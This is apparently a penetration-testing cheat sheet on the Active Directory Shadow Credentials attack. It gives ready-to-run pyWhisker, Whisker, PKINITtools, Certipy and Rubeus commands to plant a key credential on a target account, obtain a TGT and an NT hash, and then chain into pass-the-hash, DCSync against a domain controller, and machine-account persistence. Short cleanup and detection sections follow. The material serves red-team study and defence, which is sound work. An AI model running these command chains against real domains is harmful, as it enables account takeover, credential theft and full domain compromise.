# Shadow Credentials Attack

## Table of Contents

- [Overview](#overview)
- [Prerequisites](#prerequisites)
- [Enumeration](#enumeration)
- [Exploitation with pyWhisker (Linux)](#exploitation-with-pywhisker-linux)
- [Exploitation with Whisker (Windows)](#exploitation-with-whisker-windows)
- [PKINIT Authentication](#pkinit-authentication)
- [Abuse Scenarios](#abuse-scenarios)
- [Cleanup](#cleanup)

---

## Overview

Shadow Credentials is an attack technique that abuses the `msDS-KeyCredentialLink` attribute in Active Directory. This attribute is used for Windows Hello for Business (WHfB) and allows passwordless authentication via PKINIT.

**Attack Flow:**

1. Attacker adds a new Key Credential to target's `msDS-KeyCredentialLink`
2. Attacker uses the corresponding private key to request a TGT via PKINIT
3. TGT can be used to obtain NTLM hash via U2U (User-to-User) authentication

| Tool | Platform | Description |
| :--- | :--- | :--- |
| pyWhisker | Linux | Python implementation |
| Whisker | Windows | C# implementation |
| PKINITtools | Linux | PKINIT authentication tools |
| Certipy | Linux | Can also perform Shadow Credentials |

---

## Prerequisites

**Requirements:**

- Domain Functional Level: Windows Server 2016 or higher
- Target account must not have `msDS-KeyCredentialLink` protected
- Attacker needs write access to target's `msDS-KeyCredentialLink` attribute

**Who can write to msDS-KeyCredentialLink by default:**

- Domain Admins
- Enterprise Admins
- Key Admins
- Enterprise Key Admins
- Account with `GenericAll` / `GenericWrite` on target
- Account with `WriteProperty` on target

---

## Enumeration

### Check Domain Functional Level

```powershell
# PowerShell
(Get-ADDomain).DomainMode
```

```shell
# Linux with ldapsearch
ldapsearch -x -H ldap://$rhost -D "$username@$domain" -w '$password' -b "DC=$domain_part1,DC=$domain_part2" "(objectClass=domain)" msDS-Behavior-Version
```

### Check Write Permissions on Target

> Using BloodHound

```text
Look for edges:
- GenericAll
- GenericWrite
- WriteProperty
- Owns
```

> Using PowerView

```powershell
Get-DomainObjectAcl -Identity $target_user | ? {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty"}
```

### Check Existing Key Credentials

> Using pyWhisker

```shell
python3 pywhisker.py -d $domain -u $username -p '$password' --target $target_user --action list --dc-ip $rhost
```

> Using Whisker

```powershell
.\Whisker.exe list /target:$target_user
```

---

## Exploitation with pyWhisker (Linux)

### Add Shadow Credential

> Add new Key Credential to target

```shell
python3 pywhisker.py -d $domain -u $username -p '$password' --target $target_user --action add --dc-ip $rhost
```

> Add with NTLM hash

```shell
python3 pywhisker.py -d $domain -u $username -H $nthash --target $target_user --action add --dc-ip $rhost
```

> Add with custom filename

```shell
python3 pywhisker.py -d $domain -u $username -p '$password' --target $target_user --action add --dc-ip $rhost -f $output_filename
```

**Output:**

- `$output_filename.pfx` - Certificate for authentication
- DeviceID - Identifier for cleanup

### pyWhisker List Key Credentials

```shell
python3 pywhisker.py -d $domain -u $username -p '$password' --target $target_user --action list --dc-ip $rhost
```

### pyWhisker Remove Key Credential

```shell
python3 pywhisker.py -d $domain -u $username -p '$password' --target $target_user --action remove --device-id $device_id --dc-ip $rhost
```

### pyWhisker Clear All Key Credentials

```shell
python3 pywhisker.py -d $domain -u $username -p '$password' --target $target_user --action clear --dc-ip $rhost
```

---

## Exploitation with Whisker (Windows)

### Whisker Add Shadow Credential

> Add new Key Credential

```powershell
.\Whisker.exe add /target:$target_user
```

> Add with specific password for PFX

```powershell
.\Whisker.exe add /target:$target_user /password:$pfx_password
```

> Add targeting computer account

```powershell
.\Whisker.exe add /target:$target_user
.\Whisker.exe add /target:$computer$
```

### Whisker List Key Credentials

```powershell
.\Whisker.exe list /target:$target_user
```

### Whisker Remove Key Credential

```powershell
.\Whisker.exe remove /target:$target_user /deviceid:$device_id
```

### Whisker Clear All Key Credentials

```powershell
.\Whisker.exe clear /target:$target_user
```

---

## PKINIT Authentication

After adding Shadow Credential, use PKINIT to authenticate.

### Using PKINITtools (gettgtpkinit.py)

> Request TGT with certificate

```shell
python3 gettgtpkinit.py $domain/$target_user -cert-pfx $target_user.pfx -pfx-pass $pfx_password $target_user.ccache
```

> Set KRB5CCNAME and use TGT

```shell
export KRB5CCNAME=$target_user.ccache
```

### Get NTLM Hash (getnthash.py)

> Get NT hash from TGT using U2U

```shell
python3 getnthash.py $domain/$target_user -key $as_rep_key
```

The AS-REP key is output by `gettgtpkinit.py`.

### Using Certipy

> Authenticate and get NT hash

```shell
certipy auth -pfx $target_user.pfx -dc-ip $rhost
```

### Using Rubeus (Windows)

> Request TGT with certificate

```powershell
.\Rubeus.exe asktgt /user:$target_user /certificate:$target_user.pfx /password:$pfx_password /getcredentials /show /nowrap
```

---

## Abuse Scenarios

### Scenario 1: Compromise User Account

```shell
# 1. Add Shadow Credential
python3 pywhisker.py -d $domain -u $username -p '$password' --target $victim_user --action add --dc-ip $rhost

# 2. Authenticate with PKINIT
python3 gettgtpkinit.py $domain/$victim_user -cert-pfx $victim_user.pfx -pfx-pass $password $victim_user.ccache

# 3. Get NT hash
python3 getnthash.py $domain/$victim_user -key $as_rep_key

# 4. Pass-the-Hash
impacket-psexec -hashes :$nt_hash $domain/$victim_user@$target_host
```

### Scenario 2: Compromise Computer Account (DCSync)

```shell
# 1. Add Shadow Credential to DC
python3 pywhisker.py -d $domain -u $username -p '$password' --target 'DC01$' --action add --dc-ip $rhost

# 2. Authenticate as DC
python3 gettgtpkinit.py $domain/'DC01$' -cert-pfx DC01.pfx -pfx-pass $password DC01.ccache

# 3. Get DC NT hash
python3 getnthash.py $domain/'DC01$' -key $as_rep_key

# 4. DCSync
impacket-secretsdump -hashes :$dc_nt_hash $domain/'DC01$'@$rhost
```

### Scenario 3: Persistence via Machine Account

```shell
# 1. Create machine account
impacket-addcomputer $domain/$username:'$password' -computer-name 'YOURPC$' -computer-pass 'Password123!' -dc-ip $rhost

# 2. Add Shadow Credential to owned computer
python3 pywhisker.py -d $domain -u $username -p '$password' --target 'YOURPC$' --action add --dc-ip $rhost

# 3. Can always authenticate as YOURPC$ even if password changes
python3 gettgtpkinit.py $domain/'YOURPC$' -cert-pfx YOURPC.pfx -pfx-pass $password YOURPC.ccache
```

---

## Cleanup

### Remove Specific Key Credential

```shell
# Get DeviceID
python3 pywhisker.py -d $domain -u $username -p '$password' --target $target_user --action list --dc-ip $rhost

# Remove by DeviceID
python3 pywhisker.py -d $domain -u $username -p '$password' --target $target_user --action remove --device-id $device_id --dc-ip $rhost
```

### Clear All (Use with Caution!)

```shell
python3 pywhisker.py -d $domain -u $username -p '$password' --target $target_user --action clear --dc-ip $rhost
```

> ⚠️ **Warning:** Clearing all Key Credentials may break legitimate Windows Hello for Business configurations!

---

## Detection

### Event IDs to Monitor

| Event ID | Description |
| :--- | :--- |
| 4662 | Operation performed on object (look for msDS-KeyCredentialLink) |
| 5136 | Directory service object was modified |

### LDAP Query for Accounts with Key Credentials

```shell
ldapsearch -x -H ldap://$rhost -D "$username@$domain" -w '$password' -b "DC=$domain_part1,DC=$domain_part2" "(msDS-KeyCredentialLink=*)" sAMAccountName msDS-KeyCredentialLink
```

---

## Quick Reference

### Attack Chain Summary

```text
1. Enumerate: Find targets with GenericAll/GenericWrite permissions
2. Add Shadow Credential: pywhisker.py --action add
3. PKINIT Auth: gettgtpkinit.py → get TGT
4. Get NT Hash: getnthash.py → obtain NTLM hash
5. Use Hash: Pass-the-Hash, DCSync, etc.
6. Cleanup: pywhisker.py --action remove
```

### Common Commands

| Action | Command |
| :--- | :--- |
| Add Key | `pywhisker.py -d $domain -u $user -p $pass --target $target --action add` |
| List Keys | `pywhisker.py -d $domain -u $user -p $pass --target $target --action list` |
| Get TGT | `gettgtpkinit.py $domain/$target -cert-pfx cert.pfx out.ccache` |
| Get Hash | `getnthash.py $domain/$target -key $as_rep_key` |
| Auth | `certipy auth -pfx cert.pfx -dc-ip $rhost` |

### Tools

| Tool | URL |
| :--- | :--- |
| pyWhisker | <https://github.com/ShutdownRepo/pywhisker> |
| Whisker | <https://github.com/eladshamir/Whisker> |
| PKINITtools | <https://github.com/dirkjanm/PKINITtools> |
| Certipy | <https://github.com/ly4k/Certipy> |

---

## See Also

- **[AD Exploitation](3.1.AD-Exploitation.md)** - ACL abuse required for Shadow Credentials
- **[AD CS Attacks](3.5.AD-CS-Attacks.md)** - Certificate-based attacks
- **[Kerberos Attacks](3.3.Kerberos-Attacks.md)** - Kerberos authentication abuse
- **[Lateral Movement](../5.Lateral-Movement/5.1.Lateral-Movement.md)** - Post-exploitation with obtained hashes
- **[Password Attacks](3.2.Password-Attacks.md)** - Hash cracking and Pass-the-Hash
